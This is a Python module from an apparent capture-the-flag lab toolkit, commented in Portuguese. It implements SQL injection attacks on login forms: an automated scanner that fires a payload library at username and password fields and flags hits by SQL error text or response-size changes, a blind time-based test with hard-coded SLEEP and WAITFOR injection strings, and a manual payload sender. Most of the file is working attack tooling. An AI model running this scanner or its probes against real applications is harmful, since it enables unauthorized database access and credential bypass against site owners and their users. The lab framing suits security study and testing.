"""modules/sqli.py"""

from __future__ import annotations

import time

from rich.console import Console

from ctflab.core import http as H, payloads as P
from ctflab.core.session import Session
from ctflab.cli.menu import run_menu
from ctflab.cli.ui import ask, askctx, show_response, scan_table

# ── sinais de hit real ────────────────────────────────────────

_SQLI_ERROR_SIGNALS = [
    "syntax error", "mysql", "sqlite", "postgresql", "mariadb",
    "ora-", "odbc", "jdbc", "warning:", "invalid query",
    "unterminated", "unclosed", "you have an error in your sql",
]

_SQLI_SUCCESS_SIGNALS = [
    "admin", "root", "flag", "welcome", "logged in",
    "dashboard", "token", "jwt",
]


def _is_hit(status: int, body: str, baseline_len: int) -> tuple[bool, str]:
    """
    Heurística de hit real — evita falso-positivo de status 200.
    Retorna (is_hit, motivo).
    """
    body_lower = body.lower()

    for sig in _SQLI_ERROR_SIGNALS:
        if sig in body_lower:
            return True, f"erro SQL: '{sig}'"

    for sig in _SQLI_SUCCESS_SIGNALS:
        if sig in body_lower:
            return True, f"keyword: '{sig}'"

    delta = len(body) - baseline_len
    if abs(delta) > 80:
        return True, f"Δsize: {delta:+d} bytes"

    return False, ""


def _auto_scan(s: Session, c: Console) -> None:
    path = askctx(s, "path",       "path",          "/")
    uf   = askctx(s, "field_user", "campo usuário", "username")
    pf   = askctx(s, "field_pass", "campo senha",   "password")
    mode = askctx(s, "post_mode",  "modo (json/form)", "json")

    payloads = P.load("sqli")

    # baseline — tamanho de resposta com input limpo
    c.print("[dim]tirando baseline...[/dim]")
    try:
        with H.make_client(s) as cl:
            bl_r      = cl.post(path, json={uf: "baseline_user_xyz", pf: "baseline_pass_xyz"})
            baseline  = len(bl_r.text)
    except Exception:
        baseline = 0

    table = scan_table(
        f"SQL Injection — {len(payloads)} payloads",
        ["payload", "status", "hit?", "motivo", "resposta"],
    )

    hits = 0
    with H.make_client(s) as cl:
        for p in payloads:
            body_data = {uf: p, pf: "qualquer"}
            try:
                r = (
                    cl.post(path, data=body_data)
                    if mode == "form"
                    else cl.post(path, json=body_data)
                )
                status = str(r.status_code)
                hit, motivo = _is_hit(r.status_code, r.text, baseline)
                style   = "ok" if hit else ("warn" if r.status_code == 200 else "fail")
                hit_str = "[ok]sim[/ok]" if hit else "[fail]não[/fail]"
                snippet = r.text[:55]
                if hit:
                    hits += 1
                    s.note(f"SQLi hit: {p} ({motivo})")
            except Exception as exc:
                status, style, hit_str, motivo, snippet = "ERR", "fail", "-", "-", str(exc)[:55]

            table.add_row(p[:40], f"[{style}]{status}[/{style}]", hit_str, motivo, snippet)

    c.print(table)
    if hits:
        c.print(f"\n[ok]{hits} hit(s) detectado(s)![/ok]")
    else:
        c.print("\n[fail]nenhum hit[/fail]")


def _blind_timing(s: Session, c: Console) -> None:
    """
    Blind SQLi por tempo.

    Injeta SLEEP/WAITFOR e compara elapsed com baseline.
    Útil quando a aplicação não vaza nada na resposta.
    """
    path    = askctx(s, "path",       "path",          "/")
    uf      = askctx(s, "field_user", "campo usuário", "username")
    pf      = askctx(s, "field_pass", "campo senha",   "password")
    delay   = 3  # segundos de sleep injetado

    probes = [
        f"' AND SLEEP({delay})--",
        f"'; WAITFOR DELAY '0:0:{delay}'--",
        f"' OR SLEEP({delay})--",
        f"1; SELECT SLEEP({delay})--",
        f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
    ]

    c.print(f"\n[dim]baseline com request limpo...[/dim]")
    try:
        with H.make_client(s) as cl:
            t0   = time.perf_counter()
            cl.post(path, json={uf: "user", pf: "pass"})
            baseline = time.perf_counter() - t0
    except Exception as exc:
        c.print(f"[fail]{exc}[/fail]")
        return

    c.print(f"[dim]baseline: {baseline:.2f}s | threshold: {delay - 0.5:.1f}s[/dim]\n")

    table = scan_table("Blind SQLi Timing", ["probe", "elapsed", "hit?"])

    hits = 0
    with H.make_client(s) as cl:
        for probe in probes:
            try:
                t0 = time.perf_counter()
                cl.post(path, json={uf: probe, pf: "qualquer"})
                elapsed = time.perf_counter() - t0

                hit     = elapsed >= delay - 0.5
                style   = "ok" if hit else "dim"
                hit_str = "[ok]SIM[/ok]" if hit else "[fail]não[/fail]"
                if hit:
                    hits += 1
                    s.note(f"Blind SQLi timing: {probe}")
            except Exception as exc:
                elapsed, hit_str, style = 0.0, str(exc)[:30], "fail"

            table.add_row(probe[:55], f"[{style}]{elapsed:.2f}s[/{style}]", hit_str)

    c.print(table)
    if hits:
        c.print(f"\n[ok]{hits} probe(s) com delay detectado — Blind SQLi confirmado![/ok]")
    else:
        c.print("\n[fail]nenhum delay anômalo[/fail]")


def _manual(s: Session, c: Console) -> None:
    from ctflab.cli.ui import ask_json
    path    = askctx(s, "path", "path", "/")
    payload = ask_json("payload JSON")
    if payload is not None:
        r = H.post(s, path, payload)
        show_response(r, s.history[-1].elapsed, s)


_OPTIONS = {
    "1": ("varredura automática",  _auto_scan),
    "2": ("blind — timing",        _blind_timing),
    "3": ("payload manual",        _manual),
    "0": ("voltar",                None),
}


def run(session: Session, console: Console) -> None:
    console.print(f"[dim]payloads: {', '.join(P.list_available())}[/dim]")
    run_menu("SQL INJECTION", _OPTIONS, session, console)
